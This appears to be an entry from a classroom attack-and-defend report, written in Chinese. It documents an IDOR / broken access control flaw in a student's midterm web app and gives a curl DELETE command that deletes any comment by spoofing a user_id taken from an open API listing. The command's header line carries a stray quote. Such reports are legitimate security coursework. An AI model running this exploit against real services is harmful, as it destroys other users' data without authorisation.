|||
|---|---|
|**攻擊者學號**|匿名|
|**受害者學號**|r13921a20|
|**受害者網站**|[https://pleasedonthurtme.vercel.app/](https://pleasedonthurtme.vercel.app/)|
|**攻擊手段**|IDOR / Broken Access Control|
|**漏洞位置**|[https://ia-midtermweb.onrender.com/api/comments/<id>](https://ia-midtermweb.onrender.com/api/comments/<id>)|
|**攻擊指令**|`curl -X DELETE "https://ia-midtermweb.onrender.com/api/comments/$1" \`<br>`-H "Content-Type: application/json \"`<br>` -d '{"user_id":"'"$2"'"}'`<br>**Note:**<br>Both comment and user id can be access directly at:<br>[https://ia-midtermweb.onrender.com/api/comments](https://ia-midtermweb.onrender.com/api/comments)|

**成功攻擊截圖:**
![](img/IDOR/1.png){height=340}
<!-- ![](img/IDOR/2.png){height=350} -->

![](img/IDOR/3.png){height=340}
![](img/IDOR/4.png){height=50}
![](img/IDOR/5.png){height=500}
![](img/IDOR/6.png){height=500}

<div style="page-break-after: always"></div>
